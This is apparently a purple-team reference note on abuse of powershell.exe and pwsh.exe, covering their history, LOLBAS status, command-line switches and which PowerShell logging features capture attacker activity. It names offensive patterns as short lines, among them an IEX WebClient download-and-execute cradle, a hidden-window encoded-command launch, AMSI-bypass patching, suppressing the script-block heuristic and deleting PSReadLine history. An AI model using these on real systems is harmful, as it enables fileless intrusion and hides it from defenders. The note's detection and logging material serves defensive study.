# LOLBins — powershell.exe / pwsh.exe — Overview

> 🔴 **Red Flag Principle:** `powershell.exe` doesn't even qualify as a LOLBAS-catalogued LOLBin in the strict sense — the project's own maintainer explicitly rejected it from the main catalog because offensive PowerShell use is "expected" behavior for a scripting engine, not the "unexpected" functionality LOLBAS requires (full quote and citation below). That rejection is the whole detection story in miniature: there is no unusual argument shape or side-effect cache file to hunt for the way there is for `certutil.exe`. The entire evidentiary posture instead rests on whether the engine's **own logging subsystems** — Module Logging (Event ID 4103), Script Block Logging (**4104**), Transcription, and PSReadLine's on-disk history — were turned on *before* the operator ran anything, because none of them (with one narrow, heuristic-driven exception, see `05 - Detection and Hunting.md`) are enabled by default. And critically: **`-WindowStyle Hidden`, `-NoLogo`, `-NoProfile`, and `-NonInteractive` only change the console's visual/interactive behavior — none of them touch the logging pipeline.** Script Block Logging captures a script's content *after* the engine has decoded and parsed it, which is exactly why it defeats `-EncodedCommand` Base64 obfuscation outright, whether or not the window was hidden.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Legitimate vs. Abused Usage Patterns](#legitimate-vs-abused-usage-patterns)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

**This note covers two related but distinct binaries**, verified against Microsoft's own current documentation:

- **`powershell.exe`** — **Windows PowerShell**, the version that ships inside Windows itself. Per Microsoft Learn's [`What is Windows PowerShell?`](https://learn.microsoft.com/en-us/powershell/scripting/what-is-windows-powershell): *"This version of PowerShell uses the full .NET Framework, which only runs on Windows. The latest version is Windows PowerShell 5.1. Microsoft is no longer updating Windows PowerShell with new features."* 5.1 has shipped in the box since Windows 10/Server 2016 and is present, unremovable, on effectively every modern Windows endpoint at two fixed paths (see Command-Line Switches below).
- **`pwsh.exe`** — **PowerShell** (no "Windows" prefix; internally the project calls this "PowerShell 7" or historically "PowerShell Core"), a **separate product** built on modern .NET rather than .NET Framework, per the same Microsoft Learn page: *"PowerShell is built on the new versions of .NET instead of the .NET Framework and runs on Windows, Linux, and macOS."* It is **not** preinstalled on Windows — an operator or administrator must have deployed it separately (MSI, winget, a container base image, etc.), which is itself a meaningful evidentiary fact: finding `pwsh.exe` present at all narrows the field of "who put it there and why."

**Origin, verified against Microsoft's own historical documentation and the open-source project:** PowerShell began as **"Monad"** (also called the Microsoft Shell, MSH), publicly previewed in 2005 and released as **Windows PowerShell 1.0 in November 2006** for Windows XP SP2, Server 2003, and Vista. Subsequent milestones relevant to this note's scope: **2.0** (2009, Windows 7/Server 2008 R2 — introduced the ISE, remoting, and the first native scripting engine hooks security tooling now relies on); **3.0** (2012, Windows 8/Server 2012); **4.0** (2013); **5.0/5.1** (2015-2016, Windows 10/Server 2016) — this release is the one that matters most for this note, since it's the version that introduced **AMSI integration and the modern Script Block/Module Logging subsystems** this note's detection story depends on; **6.0 "PowerShell Core"** (2018) — the project **open-sourced** on GitHub (`PowerShell/PowerShell`, MIT-licensed) and became cross-platform, taking the `pwsh` binary name to coexist side-by-side with the still-present `powershell.exe`; **7.0+** (2020 onward) unified the Windows-only module-compatibility gaps left by 6.x. Current release per the project's GitHub releases page as of this build: **7.6.x is the latest Long-Term Support (LTS) line**, with `7.4.x` also still under LTS support and `7.7` in preview.

**Its status in the LOLBAS Project is the single most important historical fact for this note.** `powershell.exe` is **not** in [LOLBAS-Project/LOLBAS](https://github.com/LOLBAS-Project/LOLBAS)'s main catalog (`yml/OSBinaries/` or `yml/OtherMSBinaries/`) — verified directly against the live repository tree, which contains no `Powershell.yml` or `Pwsh.yml` in those directories. It exists only as a thin entry under [`yml/HonorableMentions/PowerShell.yml`](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/HonorableMentions/PowerShell.yml) (added 2024-04-03, three generic commands: `-ep bypass -file`, `-ep bypass -command`, `-ep bypass -ec <base64>`). The reasoning is on record from the project's primary maintainer, **Wietze Beukema (@wietze)**, closing a direct GitHub issue asking why PowerShell isn't a full LOLBin (Issue #346, quoted verbatim from the maintainer's own comment):

> "...whilst `powershell` is a great tool for offensive purposes and is often used by threat actors as part of their attacks, its use is typically seen as 'expected' for this shell/scripting-type application. A [requirement](https://github.com/LOLBAS-Project/LOLBAS#criteria) for being listed as LOLBAS is having 'unexpected' functionality... this entry would unfortunately not be the right fit for this project."

The project's own published criteria confirm this isn't a one-off judgment call — it's the stated bar for inclusion: *"Have extra 'unexpected' functionality. It is not interesting to document intended use cases."* `cmd.exe`, by contrast, **is** cataloged, because (per the same maintainer thread) its Alternate-Data-Stream and WebDAV-path handling counts as genuinely unexpected functionality layered on top of an otherwise mundane shell — a distinction worth internalizing, since it explains why this note's structure differs from `certutil/` and `ntdsutil/`: there's no single "abuse verb" or side-effect artifact to build a red-flag principle around. The abuse *is* the tool's entire designed purpose, which is precisely why the detection burden shifts almost entirely onto **whether logging was configured**, not onto any inherent tell in the binary's behavior.

## How It Works

### Execution engine, not a network client

Unlike the Impacket/BloodHound-class tools elsewhere in this module, `powershell.exe`/`pwsh.exe` has **no protocol of its own to abuse** — it's a general-purpose scripting host and .NET automation engine. Every "technique" in this note is really just a documented, intended command-line parameter combined for an unintended (or at least undisclosed) purpose. That's the entire reason it sits in `LOLBins/` rather than getting Impacket/Mimikatz-style protocol-mechanics treatment: there's no SVCCTL/DRSUAPI/DCOM handshake to diagram. What follows instead is how the pieces an operator actually chains together work, and — the module's genuinely distinctive content for this tool — how the engine's own instrumentation captures (or fails to capture) that activity.

### The abuse surface: composable, not step-based

Every scenario in `02 - Hands-On Use Cases.md` is a **combination** of independently-documented, legitimate switches (verified against Microsoft's own [`about_PowerShell_exe`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe) and [`about_Pwsh`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh) references) layered together to achieve an operational goal:

```
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <base64>
                    │              │              │                    │                    │
                    │              │              │                    │                    └─ engine decodes
                    │              │              │                    │                       UTF-16LE base64 to
                    │              │              │                    │                       a script string
                    │              │              │                    │                       BEFORE execution —
                    │              │              │                    │                       this is the exact
                    │              │              │                    │                       point Script Block
                    │              │              │                    │                       Logging captures
                    │              │              │                    │                       (plaintext, post-decode)
                    │              │              │                    └─ session-scoped only, does NOT touch the
                    │              │              │                       registry-configured policy — see the
                    │              │              │                       precedence table in 05
                    │              │              └─ console window not shown to an interactive user — a UX/visibility
                    │              │                 setting only, no effect on any logging subsystem
                    │              └─ suppresses Read-Host/confirmation prompts — used for unattended/scripted execution,
                    │                 not evasion per se, but a reliable tell that the invocation wasn't a human at a
                    │                 keyboard
                    └─ skips loading $PROFILE — faster startup, avoids environment-specific profile logic interfering,
                       and avoids leaving evidence in whatever the profile script itself might log
```

No child process is required for any of the above — the entire chain runs inside the single `powershell.exe`/`pwsh.exe` process the operator invoked, same "clean" single-process property `certutil.exe` has. What differs from `certutil` is that PowerShell's own engine is instrumented at multiple layers *by design* (this is a Microsoft-shipped defensive feature, not something bolted on) — the question for an analyst is never "did PowerShell leave a trace," it's "was the specific trace-producing subsystem turned on."

### PowerShell's own evidence surface — the four pillars

This is the module's own distinctive content for this tool: no other sub-tool in `Purple Teaming/` generates its primary evidence from the *executing engine's own instrumentation* rather than from OS-level process/file/network telemetry layered on top. Full mechanics, exact registry paths, and event schemas are in `04 - Target Evidence.md`; this table is the map.

| Pillar | What it captures | On by default? | Verified against |
|---|---|---|---|
| **Script Block Logging** (Event ID **4104**) | The full text of every script block the engine parses — **after** decoding/deobfuscation, so `-EncodedCommand` payloads and most string-concatenation obfuscation appear in plaintext | **No** — requires `EnableScriptBlockLogging` registry value or the "Turn on PowerShell Script Block Logging" GPO. **Partial exception:** a built-in heuristic auto-logs a Warning-level 4104 for scripts matching a hardcoded "suspicious string" list, even with the policy unconfigured — see `05` | [`about_Logging`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1) / [`about_Group_Policy_Settings`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings) |
| **Module Logging** (Event ID **4103**) | Pipeline execution details — parameter bindings and cmdlet invocations — for specified modules (or `*` for all) | **No** — `LogPipelineExecutionDetails` is `$false` on every module by default unless GPO/registry-forced | [`about_Group_Policy_Settings`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings) |
| **Transcription** | A plaintext, timestamped log of every command and its output, written to a file | **No** — `Start-Transcript` must be called manually, or the "Turn on PowerShell Transcription" GPO must be enabled | [`about_Group_Policy_Settings`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings) |
| **PSReadLine history** | Every line typed at an **interactive** prompt, one per line, in a plaintext file | **Yes** — on by default since PowerShell 5.0 for any interactive console session | Community-corroborated (Microsoft Learn documents the module itself but not this specific default-on behavior in prose — see the caveat in `04`) |

**The load-bearing correction this note makes:** a very common assumption is that Script Block Logging is "on by default in modern Windows" because it's so central to every PowerShell-focused detection engineering write-up. It is **not** — Microsoft's own `about_Group_Policy_Settings` reference states plainly that if the module logging policy "isn't configured, the **LogPipelineExecutionDetails** property of each module determines whether PowerShell logs the execution events... By default, the **LogPipelineExecutionDetails** property of all modules is set to `$false`," and Script Block Logging follows the identical enable-explicitly pattern. An estate that never explicitly configured this GPO is running with 4103/4104/Transcription **all off**, leaving PSReadLine's interactive-only history and process-creation telemetry (4688/Sysmon 1) as the entire evidentiary floor — a materially weaker position than most PowerShell-hunting guidance assumes.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Execution | Local process — .NET-hosted script/command interpreter, not a network service |
| Transport (download-cradle use cases only) | HTTP/HTTPS via `System.Net.WebClient` / `System.Net.Http.HttpClient` (the classes backing `Invoke-WebRequest`/`Invoke-RestMethod`) — no custom protocol |
| Encoding | UTF-16LE + Base64 for `-EncodedCommand`/`-EncodedArguments` — this specific encoding requirement (not UTF-8) is a durable, low-false-positive detection signal on its own, covered in `05` |
| In-memory execution | .NET reflection (`[System.Reflection.Assembly]::Load`), PE-in-memory loaders (Invoke-ReflectivePEInjection-style patterns), and .NET dynamic assembly generation — the mechanism behind fileless payload execution |
| Defensive integration point | AMSI (Antimalware Scan Interface) — PowerShell submits script content to AMSI for AV/EDR inspection before execution; this is the integration point AMSI-bypass techniques target (see Quick Use-Case List, and cross-link to `PowerShell Empire/01 - Overview.md`'s already-verified `mattifestation` bypass) |
| Execution-safety gate (not a security boundary) | Execution Policy — per Microsoft's own documentation, *"The execution policy isn't a security system that restricts user actions... [it] helps users to set basic rules and prevents them from violating them unintentionally"* — this framing matters for an analyst: `-ExecutionPolicy Bypass` is not "defeating a control," it's using a switch the tool's own documentation says was never a control in the adversarial sense |
| MITRE integration | Cataloged as MITRE ATT&CK technique **[T1059.001](https://attack.mitre.org/techniques/T1059/001/)** (Command and Scripting Interpreter: PowerShell) |

## Command-Line Switches — Quick Reference

Verified directly against Microsoft's [`about_PowerShell_exe`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe) (Windows PowerShell 5.1) and [`about_Pwsh`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh) (PowerShell 7.x). The two binaries share almost all switch names; differences are called out explicitly.

| Switch | Plain-English meaning | powershell.exe | pwsh.exe |
|---|---|---|---|
| `-EncodedCommand` (`-e`/`-ec` on pwsh) | Runs a Base64 (UTF-16LE) encoded command — the primary obfuscation/quoting-evasion switch this note focuses on | ✅ | ✅ |
| `-EncodedArguments` | Same idea, but for a set of arguments to pass rather than the command itself | ✅ | Documented for `powershell.exe` only; not listed in `about_Pwsh`'s syntax block |
| `-Command` (`-c` on pwsh) | Runs a script block or string; **must be the last parameter** since everything after it is treated as part of the command | ✅ | ✅ |
| `-File` (`-f` on pwsh) | Runs a `.ps1` script file, dot-sourced into the new session's scope | ✅ | ✅ (PowerShell 7.2+ restricts this to `.ps1` files specifically on Windows) |
| `-WindowStyle` (`-w` on pwsh) | Sets the console window's visual state: `Normal`, `Minimized`, `Maximized`, `Hidden`. **Cosmetic only — no effect on logging** | ✅ | ✅ (Windows only; ignored with an error on other platforms) |
| `-NoProfile` (`-nop`) | Skips loading `$PROFILE` scripts at startup — faster start, avoids environment-specific logic | ✅ | ✅ |
| `-NonInteractive` (`-noni`) | Refuses interactive prompts (`Read-Host`, confirmations) with a terminating error instead of hanging — built for unattended/scheduled execution | ✅ | ✅ |
| `-NoLogo` (`-nol`) | Suppresses the copyright banner text at startup. Purely cosmetic — no security or logging relevance | ✅ | ✅ |
| `-NoExit` (`-noe`) | Keeps the session open after running the given command/script instead of exiting | ✅ | ✅ |
| `-ExecutionPolicy` (`-ep`/`-ex`) | Sets the **session-scoped** (`Process`) execution policy, stored only in `$Env:PSExecutionPolicyPreference` — does **not** touch the registry-persisted `LocalMachine`/`CurrentUser` policy, and is **overridden by an MachinePolicy/UserPolicy GPO** if one is set (see the precedence table in `05`) | ✅ | ✅ (Windows only — ignored on non-Windows) |
| `-Sta` / `-Mta` (pwsh: `-STA`/`-MTA`) | Starts the session using a single- or multi-threaded COM apartment. STA is the default since PowerShell 3.0 | ✅ | ✅ (Windows only) |
| `-InputFormat` / `-OutputFormat` | `Text` or `XML` (CLIXML) — controls how data is piped in/out when PowerShell is itself invoked as a child of another process | ✅ | ✅ |
| `-ConfigurationName` | Targets a specific PowerShell remoting endpoint/JEA configuration rather than the default | ✅ | ✅ |
| `-Version` | Requests a specific engine version (`2.0`/`3.0` for `powershell.exe`; version-info-only for `pwsh`) | ✅ (selects engine version) | ✅ (prints version, doesn't select one — pwsh has no multi-version-in-one-binary concept) |
| `-PSConsoleFile` | Loads a saved `.psc1` console file (snap-in configuration) | ✅ | Not present in `about_Pwsh`'s syntax — removed in the PowerShell 6+ line |
| `-CustomPipeName` | (pwsh only) Names an additional IPC named pipe for cross-process debugging/attach scenarios — introduced 6.2 | Not present | ✅ |
| `-WorkingDirectory` (`-wd`) | (pwsh only) Sets the session's initial working directory | Not present | ✅ |
| `-SettingsFile` | (pwsh only) Overrides the system-wide `powershell.config.json` for the session | Not present | ✅ |
| `-Login` (`-l`) | (pwsh only, Linux/macOS) Starts as a login shell — no effect on Windows | Not present | ✅ (non-Windows only) |

## Legitimate vs. Abused Usage Patterns

There is no clean verb-level split the way `certutil`'s CA-administration verbs contrast with its download verbs — every switch above is used constantly by legitimate administration (DSC, CI/CD runners, scheduled maintenance scripts, RMM tooling). What separates routine automation from an attacker's invocation is almost entirely **combination and context**, not any single flag:

| Dimension | Routine administration | Abuse pattern (this note) |
|---|---|---|
| Switch combination | `-File <known script path>`, or an interactive session with no special flags | `-EncodedCommand` + `-WindowStyle Hidden` + `-NoProfile` + `-NonInteractive`, stacked together |
| Script/command content | Readable in the command line or the script file itself | Base64-encoded, string-concatenation-obfuscated, or piped from `IEX (New-Object Net.WebClient).DownloadString(...))`-style download cradles |
| Parent process | A scheduled task, RMM agent, CI/CD runner, or an interactively-launched console | Office application (`WINWORD.EXE`/`EXCEL.EXE`), a script host (`wscript.exe`/`cscript.exe`), another LOLBin, or a C2 implant |
| Network destination (download cradles) | Internal package repository, internal update server | External IP/domain, often newly registered or otherwise low-reputation |
| Logging posture | N/A — this is what's being contrasted, not a property of the command itself | Same command, radically different evidentiary yield depending on whether 4103/4104/Transcription were ever turned on — see `04`/`05` |

## Quick Use-Case List

- Baseline interactive or scripted execution — legitimate administrative baseline this technique's abuse variants have to hide inside
- `-EncodedCommand` Base64/UTF-16LE obfuscated execution — defeats naive command-line string matching, does **not** defeat Script Block Logging
- `-WindowStyle Hidden` + `-NoProfile` + `-NonInteractive` stacked for unattended, invisible-to-the-desktop execution
- `-ExecutionPolicy Bypass` to run an unsigned or blocked script — not a security bypass per Microsoft's own framing, but a reliable tell in a command line
- Download cradle via `IEX (New-Object Net.WebClient).DownloadString('http://...'))` — classic fileless download-and-execute in one line
- Download cradle via `Invoke-WebRequest`/`Invoke-RestMethod` piped to `Invoke-Expression`
- `.DownloadFile()`/`Invoke-WebRequest -OutFile` to stage a payload to disk before separately executing it
- In-memory/fileless .NET reflective assembly loading (`[Reflection.Assembly]::Load`) — no PE ever written to disk
- AMSI-bypass patching prior to running an otherwise AMSI-flaggable payload — see `PowerShell Empire/01 - Overview.md`'s already-verified `mattifestation`/`[Ref].Assembly.GetType('...AmsiUtils')` technique rather than re-deriving it here
- Evading PowerShell's own automatic Warning-level Script Block heuristic by clearing the in-memory "suspicious strings" signature set via reflection
- Post-execution anti-forensics: deleting/clearing the PSReadLine history file, or launching with `-NoProfile` specifically to avoid a logging profile script
- Fleet-wide/mass execution — identical `-EncodedCommand` string pushed to many hosts via GPO immediate task, a scheduled task, or C2 tasking
- Chained workflow: **PowerShell Empire** using `powershell.exe`/`pwsh.exe` as one of its five current agent languages — see `Purple Teaming/PowerShell Empire/01 - Overview.md` for the full stager/agent lifecycle this note's `-EncodedCommand` mechanics feed directly into
- Chained workflow: **Impacket's `wmiexec.py -shell-type powershell`** — every command typed is Base64-encoded and launched via `powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <b64>`, the exact switch combination this note documents, wrapped inside a separate lateral-movement tool — see `Purple Teaming/Impacket/wmiexec/02 - Hands-On Use Cases.md`
- Chained workflow: another LOLBin (e.g. `certutil -urlcache -f`) stages a `.ps1`/encoded payload to disk, which `powershell.exe` then executes as the second stage — see `Purple Teaming/LOLBins/certutil/02 - Hands-On Use Cases.md`
- Legitimate-baseline contrast: routine DSC, CI/CD, and RMM-driven automation an analyst should expect as background noise

Full walkthroughs with commands and MITRE ATT&CK mapping for every item above live in `02 - Hands-On Use Cases.md`.

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on the target | Any existing foothold that can launch a process — a macro, a script, an interactive shell, a C2 task. `powershell.exe`/`pwsh.exe` is not itself an initial-access vector |
| `powershell.exe` presence | Built into every Windows client/server since Windows 7/Server 2008 R2 (5.1 on 10/Server 2016+) — no install step needed on nearly any real-world target |
| `pwsh.exe` presence | **Not** preinstalled — requires a separate deployment (MSI/winget/container image); its mere presence on a host is itself a fact worth noting during triage |
| Privilege level | **User-level is sufficient** for every execution technique in this note. Elevation only matters for the *defensive* side — changing the `LocalMachine`-scope execution policy or the Script Block/Module Logging GPO/registry values requires administrative rights, per `about_Execution_Policies`' Vista-and-later note that changing `LocalMachine` scope needs "Run as administrator" |
| Network reachability (download-cradle use cases only) | Outbound HTTP/HTTPS to the payload-hosting URL. Not required for any purely local execution/obfuscation technique |
| Pre-staged payload (obfuscation/encode use cases) | The operator needs the script/command content ready to encode before transfer, or a `.ps1`/encoded blob already delivered to the target |
| A GPO/registry state the operator does **not** control | The entire evidentiary yield of this tool's abuse depends on logging configuration decided independently by the target's own administrators, not by the operator — a genuinely unusual prerequisite compared to every other tool in this module |
